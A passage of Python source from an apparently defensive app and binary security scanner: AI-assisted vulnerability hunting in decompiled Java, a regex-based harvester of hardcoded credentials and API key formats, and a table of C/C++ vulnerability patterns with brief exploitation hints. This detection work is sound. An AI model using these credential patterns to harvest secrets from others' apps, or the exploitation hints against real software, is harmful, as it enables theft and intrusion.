- Authentication flaws

Return a JSON object with:
{{
  "vulnerabilities": [array of vulnerability objects],
  "additional_targets": [files that should be analyzed next],
  "data_flows": [interesting data flows discovered]
}}

Return ONLY JSON, no other text. If no vulnerabilities found, return {{"vulnerabilities": [], "additional_targets": [], "data_flows": []}}"""

                    analysis_response = await gemini_request_with_retry(
                        lambda: client.aio.models.generate_content(
                            model=settings.gemini_model_id,
                            contents=[types.Content(role="user", parts=[types.Part(text=analysis_prompt)])],
                        ),
                        max_retries=3,
                        base_delay=2.0,
                        timeout_seconds=120.0,  # Reduced from 180s
                        operation_name=f"Java Deep Analysis: {target['file_path']}"
                    )
                    
                    target["analyzed"] = True
                    found_vulns = []
                    
                    if analysis_response:
                        try:
                            analysis_text = analysis_response.text.strip()
                            if "```json" in analysis_text:
                                analysis_text = analysis_text.split("```json")[1].split("```")[0]
                            elif "```" in analysis_text:
                                analysis_text = analysis_text.split("```")[1].split("```")[0]
                            
                            analysis_result = json.loads(analysis_text)
                            
                            # Collect vulnerabilities
                            for vuln in analysis_result.get("vulnerabilities", []):
                                vuln["file_path"] = target["file_path"]
                                vuln["discovered_in_pass"] = pass_num
                                found_vulns.append(vuln)
                            
                            # Collect new targets with better context
                            new_targets = []
                            for new_target in analysis_result.get("additional_targets", []):
                                if isinstance(new_target, str):
                                    # Try to find the actual file path in the codebase
                                    target_name = new_target.replace('.', '/') + '.java' if '.' in new_target and '/' not in new_target else new_target
                                    new_targets.append({
                                        "file_path": target_name,
                                        "priority": 7,  # Higher priority for AI-discovered targets
                                        "category": "data_flow",
                                        "reason": f"Data flow from {target['file_path']}",
                                        "attack_hypothesis": f"May contain sink/source for vulnerability in {target['file_path']}",
                                        "analyzed": False,
                                    })
                                elif isinstance(new_target, dict):
                                    new_targets.append({
                                        "file_path": new_target.get("file", new_target.get("path", "")),
                                        "priority": new_target.get("priority", 6),
                                        "category": new_target.get("category", "data_flow"),
                                        "reason": new_target.get("reason", f"Related to {target['file_path']}"),
                                        "attack_hypothesis": new_target.get("hypothesis", ""),
                                        "analyzed": False,
                                    })
                            
                            # Also extract class references from the vulnerability descriptions
                            for vuln in found_vulns:
                                desc = str(vuln.get("description", "")) + str(vuln.get("affected_code", ""))
                                # Look for class references like "SomeClass.method" or "import com.pkg.Class"
                                import re
                                class_refs = re.findall(r'\b([A-Z][a-zA-Z0-9]+)(?:\.[a-z][a-zA-Z0-9]*)?(?=\()', desc)
                                for class_ref in set(class_refs):
                                    if class_ref not in ['String', 'Integer', 'Boolean', 'Object', 'List', 'Map', 'Set', 'Log', 'Bundle', 'Intent', 'Context']:
                                        potential_path = f"**/{class_ref}.java"  # Will need to resolve
                                        new_targets.append({
                                            "file_path": potential_path,
                                            "priority": 5,
                                            "category": "class_reference",
                                            "reason": f"Referenced in vulnerability: {vuln.get('title', 'unknown')}",
                                            "attack_hypothesis": "May be part of vulnerable data flow",
                                            "analyzed": False,
                                        })
                            
                            return {"vulns": found_vulns, "new_targets": new_targets, "target": target}
                        except Exception as parse_err:
                            log_event("parse_error", f"Failed to parse analysis for {target['file_path']}: {parse_err}")
                    
                    return {"vulns": [], "new_targets": [], "target": target}
                
                except Exception as e:
                    log_event("analysis_error", f"Error analyzing {target['file_path']}: {e}")
                    target["analyzed"] = True
                    return {"vulns": [], "new_targets": [], "target": target}
            
            # Run up to 3 targets in parallel for speed
            import asyncio
            batch_size = 3
            for i in range(0, len(pending_targets), batch_size):
                batch = pending_targets[i:i+batch_size]
                results = await asyncio.gather(*[analyze_target(t) for t in batch], return_exceptions=True)
                
                for result in results:
                    if isinstance(result, Exception):
                        log_event("batch_error", str(result))
                        continue
                    if isinstance(result, dict):
                        vulnerabilities.extend(result.get("vulns", []))
                        # Add new targets that don't already exist
                        for new_t in result.get("new_targets", []):
                            if not any(t["file_path"] == new_t["file_path"] for t in targets):
                                targets.append(new_t)
                        if result.get("vulns"):
                            log_event("target_analyzed", f"Analyzed {result['target']['file_path']}: found {len(result['vulns'])} vulnerabilities")
        
        # ====================================================================
        # Compile Final Results
        # ====================================================================
        log_event("hunt_complete", f"Vulnerability hunt complete: {len(vulnerabilities)} vulnerabilities found")
        
        return {
            "scan_id": str(uuid.uuid4()),
            "package_name": package_name,
            "total_passes": max_passes,
            "files_scanned": len(app_files),
            "dangerous_patterns_found": len(dangerous_methods),
            "targets": targets,
            "vulnerabilities": vulnerabilities,
            "hunting_log": hunting_log,
            "summary": {
                "total_vulnerabilities": len(vulnerabilities),
                "by_severity": {
                    "critical": sum(1 for v in vulnerabilities if v.get("severity") == "critical"),
                    "high": sum(1 for v in vulnerabilities if v.get("severity") == "high"),
                    "medium": sum(1 for v in vulnerabilities if v.get("severity") == "medium"),
                    "low": sum(1 for v in vulnerabilities if v.get("severity") == "low"),
                },
                "by_category": {},
            },
        }
        
    except Exception as e:
        logger.error(f"Java vulnerability hunt failed: {e}", exc_info=True)
        log_event("fatal_error", str(e))
        return {
            "scan_id": str(uuid.uuid4()),
            "total_passes": 0,
            "targets": [],
            "vulnerabilities": [],
            "hunting_log": hunting_log,
            "error": str(e),
        }


# ============================================================================
# Sensitive Data Discovery Scanner
# Scans decompiled code for passwords, API keys, emails, phone numbers, etc.
# Uses AI to filter false positives and placeholders
# ============================================================================

async def scan_sensitive_data_with_ai(
    sources_dir: Path,
    package_name: str = "",
    max_findings_per_category: int = 50
) -> Dict[str, Any]:
    """
    Scan decompiled source code for sensitive data patterns and use AI to filter false positives.
    
    Detects:
    - Passwords (hardcoded credentials)
    - API keys and secrets
    - Usernames
    - Personal names (first/last names)
    - Email addresses
    - Phone numbers
    
    Uses AI to:
    - Filter out obvious placeholders (e.g., "your_password_here")
    - Remove false positives from library code
    - Verify findings look like real sensitive data
    
    Args:
        sources_dir: Path to JADX sources directory
        package_name: App package name for context
        max_findings_per_category: Cap per category to avoid overwhelming results
        
    Returns:
        {
            "findings": [...],           # AI-verified sensitive data findings
            "filtered_out": [...],       # Removed false positives
            "summary": {...},            # Stats by category
            "scan_stats": {...}          # Files scanned, patterns matched
        }
    """
    import time
    start_time = time.time()
    
    findings = []
    raw_matches = []
    
    if not sources_dir.exists():
        return {
            "findings": [],
            "filtered_out": [],
            "summary": {"total": 0, "by_category": {}},
            "scan_stats": {"files_scanned": 0, "error": "Sources directory not found"}
        }
    
    # ========================================================================
    # Phase 1: Regex Pattern Matching
    # ========================================================================
    
    # Patterns for sensitive data detection
    sensitive_patterns = {
        "password": [
            # Variable assignments with password
            re.compile(r'(?:password|passwd|pwd|pass)\s*[=:]\s*["\']([^"\']{3,})["\']', re.I),
            re.compile(r'(?:password|passwd|pwd)\s*=\s*"([^"]{3,})"', re.I),
            re.compile(r'setPassword\s*\(\s*["\']([^"\']+)["\']', re.I),
            re.compile(r'"password"\s*:\s*"([^"]+)"', re.I),
            re.compile(r'\.put\s*\(\s*["\']password["\']\s*,\s*["\']([^"\']+)["\']', re.I),
        ],
        "api_key": [
            # API key patterns
            re.compile(r'(?:api[_-]?key|apikey|api[_-]?secret|app[_-]?key|app[_-]?secret|secret[_-]?key|access[_-]?key)\s*[=:]\s*["\']([A-Za-z0-9_\-]{16,})["\']', re.I),
            re.compile(r'(?:GOOGLE|FIREBASE|AWS|AZURE|STRIPE|TWILIO|SENDGRID|MAILGUN|SLACK|GITHUB)[_A-Z]*[_-]?(?:KEY|SECRET|TOKEN)\s*=\s*["\']([^"\']{10,})["\']', re.I),
            re.compile(r'Bearer\s+([A-Za-z0-9_\-\.]{20,})', re.I),
            re.compile(r'Authorization["\'\s:=]+["\']?(?:Bearer\s+)?([A-Za-z0-9_\-\.]{20,})', re.I),
            re.compile(r'AIza[A-Za-z0-9_\-]{35}'),  # Google API key
            re.compile(r'sk-[A-Za-z0-9]{20,}'),  # OpenAI API key
            re.compile(r'AKIA[A-Z0-9]{16}'),  # AWS Access Key
            re.compile(r'(?:ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36,}'),  # GitHub token
        ],
        "username": [
            re.compile(r'(?:username|user[_-]?name|user[_-]?id|login[_-]?name)\s*[=:]\s*["\']([a-zA-Z0-9_\-\.@]{3,30})["\']', re.I),
            re.compile(r'\.put\s*\(\s*["\'](?:username|user)["\']s*,\s*["\']([^"\']+)["\']', re.I),
            re.compile(r'"username"\s*:\s*"([^"]+)"', re.I),
        ],
        "email": [
            re.compile(r'["\']([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["\']'),
            re.compile(r'(?:email|mail|e-mail)\s*[=:]\s*["\']([a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,})["\']', re.I),
        ],
        "phone": [
            # International and US phone formats
            re.compile(r'["\'](\+?1?[-.\s]?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4})["\']'),
            re.compile(r'["\'](\+\d{1,3}[-.\s]?\d{6,14})["\']'),
            re.compile(r'(?:phone|mobile|tel|telephone)\s*[=:]\s*["\']([+\d\-\.\s\(\)]{7,20})["\']', re.I),
        ],
        "personal_name": [
            # Personal names in credential contexts
            re.compile(r'(?:first[_-]?name|firstname|given[_-]?name)\s*[=:]\s*["\']([A-Z][a-z]{2,15})["\']', re.I),
            re.compile(r'(?:last[_-]?name|lastname|surname|family[_-]?name)\s*[=:]\s*["\']([A-Z][a-z]{2,20})["\']', re.I),
            re.compile(r'(?:full[_-]?name|name)\s*[=:]\s*["\']([A-Z][a-z]+\s+[A-Z][a-z]+)["\']', re.I),
        ],
        "private_key": [
            re.compile(r'-----BEGIN (?:RSA |EC |DSA |OPENSSH )?PRIVATE KEY-----'),
            re.compile(r'-----BEGIN PGP PRIVATE KEY BLOCK-----'),
        ],
        "database_url": [
            re.compile(r'(?:jdbc|mongodb|mysql|postgres|redis)://[^\s"\'<>]{10,}', re.I),
            re.compile(r'(?:DB_URL|DATABASE_URL|MONGO_URI|REDIS_URL)\s*=\s*["\']([^"\']+)["\']', re.I),
        ],
    }
    
    # Placeholder patterns to filter out
    placeholder_patterns = [
        re.compile(r'your[_\-]?(?:password|api|key|secret|email|name)', re.I),
        re.compile(r'(?:example|sample|test|demo|placeholder|dummy|fake|mock)(?:_|\-)?(?:password|api|key|email|user)', re.I),
        re.compile(r'xxx+|yyy+|zzz+|000+|123+', re.I),
        re.compile(r'<[^>]+>'),  # XML-style placeholders
        re.compile(r'\$\{[^}]+\}'),  # Variable placeholders
        re.compile(r'%[sd]'),  # Format strings
        re.compile(r'@string/|R\.string\.', re.I),  # Android string resources
        re.compile(r'null|undefined|none|todo|fixme', re.I),
    ]
    
    # Skip library packages
    skip_packages = [
        "androidx/", "android/support/", "com/google/android/", "kotlin/", "kotlinx/",
        "org/apache/", "com/squareup/", "io/reactivex/", "okhttp3/", "retrofit2/",
        "com/fasterxml/", "org/json/", "com/bumptech/", "dagger/", "javax/",
        "org/bouncycastle/", "com/auth0/", "io/jsonwebtoken/"
    ]
    
    # Collect Java files
    java_files = list(sources_dir.rglob("*.java"))
    app_files = []
    for f in java_files:
        rel_path = str(f.relative_to(sources_dir))
        if not any(rel_path.startswith(skip) or f"/{skip}" in rel_path for skip in skip_packages):
            app_files.append(f)
    
    # Cap files to scan
    MAX_FILES = 2000
    if len(app_files) > MAX_FILES:
        app_files = app_files[:MAX_FILES]
    
    logger.info(f"Sensitive data scan: Scanning {len(app_files)} files")
    
    # Scan each file
    files_with_matches = 0
    for java_file in app_files:
        try:
            content = java_file.read_text(encoding='utf-8', errors='ignore')
            rel_path = str(java_file.relative_to(sources_dir))
            lines = content.split('\n')
            
            file_had_match = False
            
            for category, patterns in sensitive_patterns.items():
                for pattern in patterns:
                    for match in pattern.finditer(content):
                        # Get matched value
                        value = match.group(1) if match.lastindex else match.group(0)
                        
                        # Skip if matches placeholder pattern
                        is_placeholder = any(p.search(value) for p in placeholder_patterns)
                        if is_placeholder:
                            continue
                        
                        # Skip very short values
                        if len(value) < 3:
                            continue
                        
                        # Find line number
                        pos = match.start()
                        line_num = content[:pos].count('\n') + 1
                        
                        # Get surrounding code context
                        start_line = max(0, line_num - 3)
                        end_line = min(len(lines), line_num + 2)
                        code_context = '\n'.join(lines[start_line:end_line])
                        
                        raw_matches.append({
                            "category": category,
                            "value": value[:100],  # Truncate long values
                            "masked_value": _mask_sensitive_value(value),
                            "file_path": rel_path,
                            "line": line_num,
                            "code_context": code_context[:500],
                            "pattern_matched": pattern.pattern[:100],
                        })
                        file_had_match = True
            
            if file_had_match:
                files_with_matches += 1
                
        except Exception as e:
            logger.debug(f"Error scanning {java_file}: {e}")
            continue
    
    logger.info(f"Sensitive data scan: Found {len(raw_matches)} raw matches in {files_with_matches} files")
    
    # ========================================================================
    # Phase 2: AI Filtering (remove false positives and placeholders)
    # ========================================================================
    
    if not raw_matches:
        return {
            "findings": [],
            "filtered_out": [],
            "summary": {"total": 0, "by_category": {}},
            "scan_stats": {
                "files_scanned": len(app_files),
                "raw_matches": 0,
                "scan_time": time.time() - start_time
            }
        }
    
    # Group matches by category for efficient AI processing
    by_category = {}
    for match in raw_matches:
        cat = match["category"]
        if cat not in by_category:
            by_category[cat] = []
        if len(by_category[cat]) < max_findings_per_category:
            by_category[cat].append(match)
    
    # Use AI to filter false positives
    verified_findings = []
    filtered_out = []
    
    if settings.gemini_api_key:
        try:
            from google import genai
            from google.genai import types
            
            client = genai.Client(api_key=settings.gemini_api_key)
            
            # Process each category
            for category, matches in by_category.items():
                if not matches:
                    continue
                
                # Build prompt for AI verification
                prompt = f"""Analyze these potential sensitive data findings from an Android app's decompiled source code.
For each finding, determine if it's a REAL sensitive value or a FALSE POSITIVE.

App Package: {package_name}
Category: {category.upper()}

FINDINGS TO ANALYZE:
"""
                for i, m in enumerate(matches[:30]):  # Limit per batch
                    prompt += f"""
---
#{i+1}
Value: {m['value'][:50]}
File: {m['file_path']}
Line: {m['line']}
Context:
```
{m['code_context'][:300]}
```
"""
                
                prompt += """

For each finding, respond with EXACTLY this JSON format (no markdown):
{
  "results": [
    {
      "index": 1,
      "verdict": "REAL" or "FALSE_POSITIVE",
      "confidence": 0-100,
      "reasoning": "brief explanation",
      "risk_level": "critical/high/medium/low/none",
      "data_type": "more specific type if identifiable"
    }
  ]
}

FILTER OUT AS FALSE POSITIVES:
- Placeholder values like "your_password_here", "example@email.com", "TODO", etc.
- Empty or test values like "test", "demo", "sample", "123456"
- Resource references like "@string/password" or "R.string.email"
- Format strings with %s, %d, ${variable}
- Library code examples or documentation strings
- Generic getter/setter method names
- Obviously fake data like "John Doe", "555-1234"

MARK AS REAL IF:
- Looks like an actual hardcoded credential or key
- Has specific format matching real API keys (e.g., starts with sk-, AIza, etc.)
- Appears to be actual user data being hardcoded
- Is in a configuration or secrets file
- Has entropy suggesting a real secret

Be STRICT - only mark as REAL if it genuinely looks like sensitive data that shouldn't be in source code."""

                try:
                    response = await client.aio.models.generate_content(
                        model=settings.gemini_model_id,
                        contents=[types.Content(role="user", parts=[types.Part(text=prompt)])],
                    )
                    
                    # Parse AI response
                    response_text = response.text.strip()
                    # Remove markdown code blocks if present
                    if response_text.startswith("```"):
                        response_text = re.sub(r'^```\w*\n?', '', response_text)
                        response_text = re.sub(r'\n?```$', '', response_text)
                    
                    ai_results = json.loads(response_text)
                    
                    for result in ai_results.get("results", []):
                        idx = result.get("index", 0) - 1
                        if 0 <= idx < len(matches):
                            match = matches[idx]
                            if result.get("verdict") == "REAL" and result.get("confidence", 0) >= 50:
                                match["ai_verification"] = {
                                    "verdict": "REAL",
                                    "confidence": result.get("confidence", 0),
                                    "reasoning": result.get("reasoning", ""),
                                    "risk_level": result.get("risk_level", "medium"),
                                    "specific_type": result.get("data_type", category)
                                }
                                verified_findings.append(match)
                            else:
                                match["filter_reason"] = result.get("reasoning", "AI determined false positive")
                                filtered_out.append(match)
                                
                except json.JSONDecodeError as e:
                    logger.warning(f"AI response parse error for {category}: {e}")
                    # On parse error, include matches with lower confidence
                    for match in matches:
                        match["ai_verification"] = {
                            "verdict": "UNVERIFIED",
                            "confidence": 30,
                            "reasoning": "AI verification failed - manual review recommended"
                        }
                        verified_findings.append(match)
                except Exception as e:
                    logger.error(f"AI verification error for {category}: {e}")
                    for match in matches:
                        match["ai_verification"] = {
                            "verdict": "UNVERIFIED", 
                            "confidence": 30,
                            "reasoning": f"Verification error: {str(e)[:50]}"
                        }
                        verified_findings.append(match)
        except Exception as e:
            logger.error(f"AI verification failed entirely: {e}")
            # Return raw matches without AI filtering
            verified_findings = raw_matches
    else:
        # No API key - apply basic heuristic filtering
        logger.warning("No Gemini API key - using heuristic filtering only")
        for match in raw_matches:
            value = match["value"].lower()
            # Basic heuristic: filter obvious placeholders
            if any(x in value for x in ['example', 'test', 'demo', 'placeholder', 'your_', 'xxx', 'todo']):
                match["filter_reason"] = "Heuristic: appears to be placeholder"
                filtered_out.append(match)
            else:
                match["ai_verification"] = {
                    "verdict": "UNVERIFIED",
                    "confidence": 50,
                    "reasoning": "AI unavailable - heuristic check passed"
                }
                verified_findings.append(match)
    
    # ========================================================================
    # Build Summary
    # ========================================================================
    
    summary = {
        "total": len(verified_findings),
        "by_category": {},
        "by_risk": {"critical": 0, "high": 0, "medium": 0, "low": 0},
        "high_confidence_count": 0
    }
    
    for f in verified_findings:
        cat = f.get("category", "unknown")
        summary["by_category"][cat] = summary["by_category"].get(cat, 0) + 1
        
        risk = f.get("ai_verification", {}).get("risk_level", "medium")
        if risk in summary["by_risk"]:
            summary["by_risk"][risk] += 1
        
        if f.get("ai_verification", {}).get("confidence", 0) >= 80:
            summary["high_confidence_count"] += 1
    
    elapsed = time.time() - start_time
    logger.info(f"Sensitive data scan complete: {len(verified_findings)} verified findings, {len(filtered_out)} filtered, {elapsed:.1f}s")
    
    return {
        "findings": verified_findings,
        "filtered_out": filtered_out,
        "summary": summary,
        "scan_stats": {
            "files_scanned": len(app_files),
            "raw_matches": len(raw_matches),
            "verified": len(verified_findings),
            "filtered": len(filtered_out),
            "scan_time": elapsed
        }
    }


def _mask_sensitive_value(value: str) -> str:
    """Mask sensitive values for safe display (show first/last 2 chars)."""
    if len(value) <= 6:
        return "*" * len(value)
    return value[:2] + "*" * (len(value) - 4) + value[-2:]


# ============================================================================
# BINARY PATTERN-BASED CODE SCANNER (Part 1 of Binary Analyzer Enhancement)
# Comprehensive vulnerability detection for Ghidra decompiled C/C++ code
# ============================================================================

# Pre-compiled patterns for binary vulnerability scanning
BINARY_VULN_PATTERNS = {
    # ========================================================================
    # BUFFER OVERFLOW PATTERNS (CWE-120, CWE-119)
    # ========================================================================
    "buffer_overflow": [
        {
            "pattern": re.compile(r'\bstrcpy\s*\(', re.I),
            "title": "Unsafe strcpy Usage",
            "severity": "critical",
            "cwe": "CWE-120",
            "description": "strcpy does not check buffer bounds, leading to buffer overflow",
            "exploitation": "Provide input longer than destination buffer to overwrite stack/heap",
            "remediation": "Use strncpy or strlcpy with explicit size limits"
        },
        {
            "pattern": re.compile(r'\bstrcat\s*\(', re.I),
            "title": "Unsafe strcat Usage",
            "severity": "critical",
            "cwe": "CWE-120",
            "description": "strcat does not check remaining buffer space",
            "exploitation": "Concatenate strings to overflow buffer boundaries",
            "remediation": "Use strncat or strlcat with size checking"
        },
        {
            "pattern": re.compile(r'\bsprintf\s*\(', re.I),
            "title": "Unsafe sprintf Usage",
            "severity": "critical",
            "cwe": "CWE-120",
            "description": "sprintf has no length limit for output buffer",
            "exploitation": "Format string with large output to overflow buffer",
            "remediation": "Use snprintf with explicit buffer size"
        },
        {
            "pattern": re.compile(r'\bvsprintf\s*\(', re.I),
            "title": "Unsafe vsprintf Usage",
            "severity": "critical",
            "cwe": "CWE-120",
            "description": "vsprintf has no length limit for output buffer",
            "exploitation": "Pass format args that produce large output",
            "remediation": "Use vsnprintf with explicit buffer size"
        },
        {
            "pattern": re.compile(r'\bgets\s*\(', re.I),
            "title": "Extremely Dangerous gets() Usage",
            "severity": "critical",
            "cwe": "CWE-120",
            "description": "gets() has NO length limit - guaranteed buffer overflow vector",
            "exploitation": "Trivial exploitation - just input more than buffer size",
            "remediation": "Use fgets() with explicit buffer size"
        },
        {
            "pattern": re.compile(r'\bscanf\s*\(\s*["\'][^"\']*%s', re.I),
            "title": "Unbounded scanf %s",
            "severity": "critical",
            "cwe": "CWE-120",
            "description": "scanf %s reads unlimited input into buffer",
            "exploitation": "Input string longer than destination buffer",
            "remediation": "Use width specifier: scanf(\"%255s\", buf)"
        },
        {
            "pattern": re.compile(r'\bwcscpy\s*\(', re.I),
            "title": "Unsafe wcscpy (Wide String)",
            "severity": "critical",
            "cwe": "CWE-120",
            "description": "Wide-char version of strcpy with same vulnerabilities",
            "exploitation": "Same as strcpy but with wide characters",
            "remediation": "Use wcsncpy with size limits"
        },
        {
            "pattern": re.compile(r'\bwcscat\s*\(', re.I),
            "title": "Unsafe wcscat (Wide String)",
            "severity": "critical",
            "cwe": "CWE-120",
            "description": "Wide-char version of strcat with same vulnerabilities",
            "exploitation": "Same as strcat but with wide characters",
            "remediation": "Use wcsncat with size limits"
        },
        {
            "pattern": re.compile(r'\blstrcpy[AW]?\s*\(', re.I),
            "title": "Unsafe Windows lstrcpy",
            "severity": "critical",
            "cwe": "CWE-120",
            "description": "Windows lstrcpy has no bounds checking",
            "exploitation": "Same as strcpy exploitation",
            "remediation": "Use StringCchCopy or StringCbCopy"
        },
        {
            "pattern": re.compile(r'\blstrcat[AW]?\s*\(', re.I),
            "title": "Unsafe Windows lstrcat",
            "severity": "critical",
            "cwe": "CWE-120",
            "description": "Windows lstrcat has no bounds checking",
            "exploitation": "Same as strcat exploitation",
            "remediation": "Use StringCchCat or StringCbCat"
        },
        {
            "pattern": re.compile(r'\b_mbscpy\s*\(', re.I),
            "title": "Unsafe _mbscpy (Multibyte)",
            "severity": "critical",
            "cwe": "CWE-120",
            "description": "Multibyte string copy without bounds checking",
            "exploitation": "Buffer overflow via multibyte string",
            "remediation": "Use _mbsncpy with size limits"
        },
        {
            "pattern": re.compile(r'\bmemcpy\s*\([^,]+,\s*[^,]+,\s*[a-zA-Z_][a-zA-Z0-9_]*\s*\)', re.I),
            "title": "memcpy with Variable Size",
            "severity": "high",
            "cwe": "CWE-120",
            "description": "memcpy size from variable may be attacker-controlled",
            "exploitation": "Control size parameter to copy beyond buffer bounds",
            "remediation": "Validate size against destination buffer capacity"
        },
        {
            "pattern": re.compile(r'\bmemmove\s*\([^,]+,\s*[^,]+,\s*[a-zA-Z_][a-zA-Z0-9_]*\s*\)', re.I),
            "title": "memmove with Variable Size",
            "severity": "high",
            "cwe": "CWE-120",
            "description": "memmove size from variable may be attacker-controlled",
            "exploitation": "Control size parameter to move beyond buffer bounds",
            "remediation": "Validate size against destination buffer capacity"
        },
        {
            "pattern": re.compile(r'\bCopyMemory\s*\(|RtlCopyMemory\s*\(', re.I),
            "title": "Windows CopyMemory/RtlCopyMemory",
            "severity": "high",
            "cwe": "CWE-120",
            "description": "Windows memory copy functions without built-in bounds checking",
            "exploitation": "Same as memcpy exploitation",
            "remediation": "Validate size parameters before copy"
        },
        {
            "pattern": re.compile(r'\bstpcpy\s*\(', re.I),
            "title": "Unsafe stpcpy Usage",
            "severity": "critical",
            "cwe": "CWE-120",
            "description": "stpcpy is strcpy variant without bounds checking",
            "exploitation": "Same as strcpy exploitation",
            "remediation": "Use stpncpy or manual bounds checking"
        },
    ],

    # ========================================================================
    # FORMAT STRING PATTERNS (CWE-134)
    # ========================================================================
    "format_string": [
        {
            "pattern": re.compile(r'\bprintf\s*\(\s*[a-zA-Z_][a-zA-Z0-9_]*\s*\)', re.I),
            "title": "Format String Vulnerability (printf)",
            "severity": "critical",
            "cwe": "CWE-134",
            "description": "printf with user-controlled format string allows arbitrary read/write",
            "exploitation": "Use %x to leak stack, %n to write memory, %s to read strings",
            "remediation": "Always use literal format string: printf(\"%s\", var)"
        },
        {
            "pattern": re.compile(r'\bfprintf\s*\([^,]+,\s*[a-zA-Z_][a-zA-Z0-9_]*\s*\)', re.I),
            "title": "Format String Vulnerability (fprintf)",
            "severity": "critical",
            "cwe": "CWE-134",
            "description": "fprintf with user-controlled format string",
            "exploitation": "Same as printf but output to file/stream",
            "remediation": "Use literal format string: fprintf(fp, \"%s\", var)"
        },
        {
            "pattern": re.compile(r'\bsprintf\s*\([^,]+,\s*[a-zA-Z_][a-zA-Z0-9_]*\s*\)', re.I),
            "title": "Format String Vulnerability (sprintf)",
            "severity": "critical",
            "cwe": "CWE-134",
            "description": "sprintf with user-controlled format string",
            "exploitation": "Stack/heap corruption via format specifiers",
            "remediation": "Use literal format string with snprintf"
        },
        {
            "pattern": re.compile(r'\bsnprintf\s*\([^,]+,\s*[^,]+,\s*[a-zA-Z_][a-zA-Z0-9_]*\s*\)', re.I),
            "title": "Format String Vulnerability (snprintf)",
            "severity": "high",
            "cwe": "CWE-134",
            "description": "snprintf with user-controlled format string",
            "exploitation": "Information disclosure via %x, limited write via %n",
            "remediation": "Use literal format string"
        },
        {
            "pattern": re.compile(r'\bsyslog\s*\([^,]+,\s*[a-zA-Z_][a-zA-Z0-9_]*\s*\)', re.I),
            "title": "Format String Vulnerability (syslog)",
            "severity": "critical",
            "cwe": "CWE-134",
            "description": "syslog with user-controlled format string",
            "exploitation": "Remote exploitation if input reaches syslog",
            "remediation": "Use literal format string: syslog(LOG_INFO, \"%s\", var)"
        },
        {
            "pattern": re.compile(r'\bwprintf\s*\(\s*[a-zA-Z_][a-zA-Z0-9_]*\s*\)', re.I),
            "title": "Format String Vulnerability (wprintf)",
            "severity": "critical",
            "cwe": "CWE-134",
            "description": "Wide-char printf with user-controlled format",
            "exploitation": "Same as printf but with wide characters",
            "remediation": "Use literal format string"
        },
        {
            "pattern": re.compile(r'%n', re.I),
            "title": "%n Format Specifier Detected",
            "severity": "high",
            "cwe": "CWE-134",
            "description": "%n writes bytes count to memory - can be weaponized",
            "exploitation": "Use %n with controlled address to write arbitrary values",
            "remediation": "Remove %n usage or ensure format string is constant"
        },
    ],

    # ========================================================================
    # COMMAND INJECTION PATTERNS (CWE-78)
    # ========================================================================
    "command_injection": [
        {
            "pattern": re.compile(r'\bsystem\s*\(\s*[a-zA-Z_][a-zA-Z0-9_]*', re.I),
            "title": "Command Injection (system)",
            "severity": "critical",
            "cwe": "CWE-78",
            "description": "system() with variable argument allows command injection",
            "exploitation": "Inject shell metacharacters: ; | & ` $() etc",
            "remediation": "Avoid system(), use exec* family with explicit args"
        },
        {
            "pattern": re.compile(r'\bpopen\s*\(\s*[a-zA-Z_][a-zA-Z0-9_]*', re.I),
            "title": "Command Injection (popen)",
            "severity": "critical",
            "cwe": "CWE-78",
            "description": "popen() with variable command allows injection",
            "exploitation": "Same as system() exploitation",
            "remediation": "Avoid popen(), use pipe()+fork()+exec() with validation"
        },
        {
            "pattern": re.compile(r'\bexecl\s*\(|execle\s*\(|execlp\s*\(', re.I),
            "title": "Process Execution (exec* family)",
            "severity": "medium",
            "cwe": "CWE-78",
            "description": "exec* functions execute external programs",
            "exploitation": "If path/args come from user input, may execute arbitrary code",
            "remediation": "Validate and sanitize all arguments"
        },
        {
            "pattern": re.compile(r'\bexecv\s*\(|execve\s*\(|execvp\s*\(', re.I),
            "title": "Process Execution (execv* family)",
            "severity": "medium",
            "cwe": "CWE-78",
            "description": "execv* functions execute with argument array",
            "exploitation": "Argument injection if array elements are user-controlled",
            "remediation": "Validate and sanitize all arguments"
        },
        {
            "pattern": re.compile(r'\bShellExecute[AW]?\s*\(', re.I),
            "title": "Windows ShellExecute",
            "severity": "high",
            "cwe": "CWE-78",
            "description": "Windows ShellExecute can run arbitrary programs",
            "exploitation": "Pass malicious URL or program path",
            "remediation": "Validate all parameters, avoid user-controlled input"
        },
        {
            "pattern": re.compile(r'\bShellExecuteEx[AW]?\s*\(', re.I),
            "title": "Windows ShellExecuteEx",
            "severity": "high",
            "cwe": "CWE-78",
            "description": "Extended ShellExecute with same risks",
            "exploitation": "Same as ShellExecute",
            "remediation": "Validate all SHELLEXECUTEINFO fields"
        },
        {
            "pattern": re.compile(r'\bCreateProcess[AW]?\s*\(', re.I),
            "title": "Windows CreateProcess",
            "severity": "medium",
            "cwe": "CWE-78",
            "description": "CreateProcess can spawn arbitrary processes",
            "exploitation": "Command line injection if lpCommandLine is user-controlled",
            "remediation": "Use lpApplicationName, validate lpCommandLine"
        },
        {
            "pattern": re.compile(r'\bWinExec\s*\(', re.I),
            "title": "Deprecated WinExec",
            "severity": "high",
            "cwe": "CWE-78",
            "description": "Legacy Windows function for executing programs",
            "exploitation": "Simple command injection vector",
            "remediation": "Use CreateProcess with proper validation"
        },
        {
            "pattern": re.compile(r'\b_wsystem\s*\(', re.I),
            "title": "Wide-char system() (_wsystem)",
            "severity": "critical",
            "cwe": "CWE-78",
            "description": "Wide-char version of system() with same risks",
            "exploitation": "Same as system() but with wide strings",
            "remediation": "Avoid _wsystem(), use safer alternatives"
        },
        {
            "pattern": re.compile(r'\b_popen\s*\(|_wpopen\s*\(', re.I),
            "title": "Windows _popen/_wpopen",
            "severity": "critical",
            "cwe": "CWE-78",
            "description": "Windows popen variants with command injection risk",
            "exploitation": "Same as popen() exploitation",
            "remediation": "Use CreateProcess with pipes for safer I/O"
        },
    ],

    # ========================================================================
    # INTEGER OVERFLOW PATTERNS (CWE-190)
    # ========================================================================
    "integer_overflow": [
        {
            "pattern": re.compile(r'\bmalloc\s*\([^)]*\*[^)]*\)', re.I),
            "title": "Integer Overflow in malloc Size",
            "severity": "high",
            "cwe": "CWE-190",
            "description": "Multiplication in malloc size can overflow to small allocation",
            "exploitation": "Cause small allocation, then overflow heap buffer",
            "remediation": "Check for overflow before multiplication"
        },
        {
